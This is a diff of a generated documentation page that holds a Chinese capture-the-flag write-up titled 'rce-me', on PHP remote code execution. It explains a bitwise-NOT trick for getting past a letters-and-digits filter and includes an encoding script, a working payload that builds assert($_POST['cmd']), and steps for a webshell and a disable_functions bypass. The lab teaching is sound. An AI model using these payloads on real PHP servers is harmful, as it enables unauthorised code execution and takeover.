@@ -1763,6 +1763,8 @@
       
         
       
+        
+      
     
     
     
@@ -1858,6 +1860,36 @@
     
   
     RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL注入
   
 
     
@@ -2535,16 +2567,16 @@
 <p><strong>这逼出一个核心技术：按位取反。</strong></p>
 <h3 id="_2"><a class="toclink" href="../../rce-me/#_2">原理</a></h3>
 <p>PHP 对字符串做 <code>~</code> 是<strong>逐字节取反</strong>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">~"a"      →  0x9E（非打印字符）</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="x">~"\x9E"   →  'a'   （反过来）</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">~"a"      →  0x9E（非打印字符）</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">~"\x9E"   →  'a'   （反过来）</span>
 </span></code></pre></div>
 <p><strong>所以只要写出「目标字符串取反后的字节」，运行时就能还原出任意单词。</strong></p>
 <p><strong>关键：这些字节 URL 编码后全是 <code>%xx</code>，不含任何字母数字 → 能过过滤。</strong></p>
 <h3 id="_3"><a class="toclink" href="../../rce-me/#_3">脚本</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">nt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'</span><span class="si">%%%02x</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="o">~</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">nt</span><span class="p">(</span><span class="s2">"assert"</span><span class="p">))</span>    <span class="c1"># %9e%8c%8c%9a%8d%8b</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">nt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'</span><span class="si">%%%02x</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="o">~</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">nt</span><span class="p">(</span><span class="s2">"assert"</span><span class="p">))</span>    <span class="c1"># %9e%8c%8c%9a%8d%8b</span>
 </span></code></pre></div>
 <h3 id="_4"><a class="toclink" href="../../rce-me/#_4">常用对照表</a></h3>
 <table>
@@ -2582,38 +2614,38 @@
 </tbody>
 </table>
 <h3 id="payload"><a class="toclink" href="../../rce-me/#payload">payload</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">$_=~"%9e%8c%8c%9a%8d%8b";      // $_ = "assert"</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">$__=~"%a0%af%b0%ac%ab";        // $__ = "_POST"</span>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="x">$_(${$__}[~"%9c%92%9b"]);      // assert($_POST["cmd"])</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">$_=~"%9e%8c%8c%9a%8d%8b";      // $_ = "assert"</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">$__=~"%a0%af%b0%ac%ab";        // $__ = "_POST"</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">$_(${$__}[~"%9c%92%9b"]);      // assert($_POST["cmd"])</span>
 </span></code></pre></div>
 <p><strong>逐段看：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>$_=~"..."          变量名只用 $ 和 _,不含字母 ✓
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>${$__}[...]        用变量的值当变量名 → $_POST
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>[~"%9c%92%9b"]     数组下标也可以是取反表达式 → ["cmd"]
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$_=~"..."          变量名只用 $ 和 _,不含字母 ✓
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>${$__}[...]        用变量的值当变量名 → $_POST
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>[~"%9c%92%9b"]     数组下标也可以是取反表达式 → ["cmd"]
 </span></code></pre></div>
 <h3 id="eval-assert"><a class="toclink" href="../../rce-me/#eval-assert">为什么要在 eval 里套一层 assert</a></h3>
 <p>这题的入口是：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">@eval($code);        // $code 里不能有字母和数字</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">@eval($code);        // $code 里不能有字母和数字</span>
 </span></code></pre></div>
 <p><strong>所以 <code>$code</code> 只能写符号 —— 但"写不出字母"不等于"跑不了代码"，关键就在这层 <code>assert</code>。</strong></p>
 <h4 id="eval_postcmd"><a class="toclink" href="../../rce-me/#eval_postcmd">为什么不能直接 <code>eval($_POST['cmd'])</code></a></h4>
 <p><strong>两个原因，第二个是决定性的。</strong></p>
 <p><strong>① 你写不出 <code>eval</code> 这个词</strong></p>
 <p><strong>取反其实能构造出来：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">$_=~"%9a%89%9e%93";      // $_ = "eval"</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$_=~"%9a%89%9e%93";      // $_ = "eval"</span>
 </span></code></pre></div>
 <p><strong>② 但就算构造出来了，也用不了 —— <code>eval</code> 不是函数</strong></p>
 <p><strong>实测：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>$f = 'eval';
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>$f('echo "hello";');
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>→ ❌ Call to undefined function eval()
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$f = 'eval';
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>$f('echo "hello";');
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>→ ❌ Call to undefined function eval()
 </span></code></pre></div>
 <p><strong><code>eval</code> 是</strong>语言结构<strong>（和 <code>echo</code>、<code>if</code> 一样），</strong>不是函数<strong>。
 所以「变量函数调用」<code>$f()</code> 根本调不到它 —— PHP 会去找一个名叫 <code>eval()</code> 的函数，找不到。</strong></p>
 <h4 id="_5"><a class="toclink" href="../../rce-me/#_5">所以必须换一个「能把字符串当代码跑」的函数</a></h4>
 <p><strong><code>assert</code> 就是（PHP &lt; 7.2）：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">$g = 'assert';</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">$g('system("id")');      // ✅ 能调用，而且参数会被当代码求值</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x">$g = 'assert';</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="x">$g('system("id")');      // ✅ 能调用，而且参数会被当代码求值</span>
 </span></code></pre></div>
 <p><strong>但它求的是</strong>表达式<strong>，不是语句：</strong></p>
 <table>
@@ -2636,11 +2668,11 @@
 </table>
 <p><strong>所以 POST 里传的必须是一句</strong>表达式<strong>（比如 <code>system('cat /flag')</code>），不能带 <code>;</code> 和多条语句。</strong></p>
 <h4 id="_6"><a class="toclink" href="../../rce-me/#_6">于是就成了「两层」</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>eval(                      ← 外层：服务器给的，只能用符号写
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>  assert(                  ← 内层：用取反拼出来的函数名
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>    $_POST['cmd']          ← 这里可以随便写字母
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>  )
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>eval(                      ← 外层：服务器给的，只能用符号写
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>  assert(                  ← 内层：用取反拼出来的函数名
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    $_POST['cmd']          ← 这里可以随便写字母
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  )
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>)
 </span></code></pre></div>
 <p><strong>一句话：</strong></p>
 <blockquote>
@@ -2653,24 +2685,24 @@
 这题能过，说明靶场是 PHP 5.x / 7.0~7.1。</p>
 </div>
 <h3 id="_7"><a class="toclink" href="../../rce-me/#_7">后面的路</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① phpinfo 查 disable_functions → assert、eval 还在
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>② 构造一句话 → 蚁剑连接
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>③ 根目录有 flag 但读不了(权限)
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>④ 旁边有 /readflag(SUID 程序)
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>⑤ 装蚁剑「绕过 disable_functions」插件
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>⑥ 开终端 → whoami 可用,但 /readflag 没反应
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>① phpinfo 查 disable_functions → assert、eval 还在
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>② 构造一句话 → 蚁剑连接
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>③ 根目录有 flag 但读不了(权限)
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>④ 旁边有 /readflag(SUID 程序)
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>⑤ 装蚁剑「绕过 disable_functions」插件
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>⑥ 开终端 → whoami 可用,但 /readflag 没反应
 </span></code></pre></div>
 <h3 id="readflag"><a class="toclink" href="../../rce-me/#readflag">/readflag 没输出的排查</a></h3>
 <p><strong>先分清「能用」的含义：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>cd        →  蚁剑自己实现的,不是真命令
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>whoami    →  真的二进制在跑  ← 所以问题在 /readflag 本身
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>cd        →  蚁剑自己实现的,不是真命令
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>whoami    →  真的二进制在跑  ← 所以问题在 /readflag 本身
 </span></code></pre></div>
 <p><strong>诊断命令：</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ls<span class="w"> </span>-l<span class="w"> </span>/readflag<span class="w">              </span><span class="c1"># 有没有 SUID(s 位)</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>id<span class="w">                           </span><span class="c1"># 当前是谁</span>
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>/readflag<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">               </span><span class="c1"># stderr 合并</span>
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>/readflag<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"EXIT=</span><span class="nv">$?</span><span class="s2">"</span><span class="w">    </span><span class="c1"># 看退出码</span>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>/readflag<span class="w"> </span>&gt;<span class="w"> </span>/tmp/a<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/a
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ls<span class="w"> </span>-l<span class="w"> </span>/readflag<span class="w">              </span><span class="c1"># 有没有 SUID(s 位)</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>id<span class="w">                           </span><span class="c1"># 当前是谁</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>/readflag<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">               </span><span class="c1"># stderr 合并</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>/readflag<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"EXIT=</span><span class="nv">$?</span><span class="s2">"</span><span class="w">    </span><span class="c1"># 看退出码</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>/readflag<span class="w"> </span>&gt;<span class="w"> </span>/tmp/a<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/a
 </span></code></pre></div>
 <p><strong>退出码：</strong></p>
 <table>
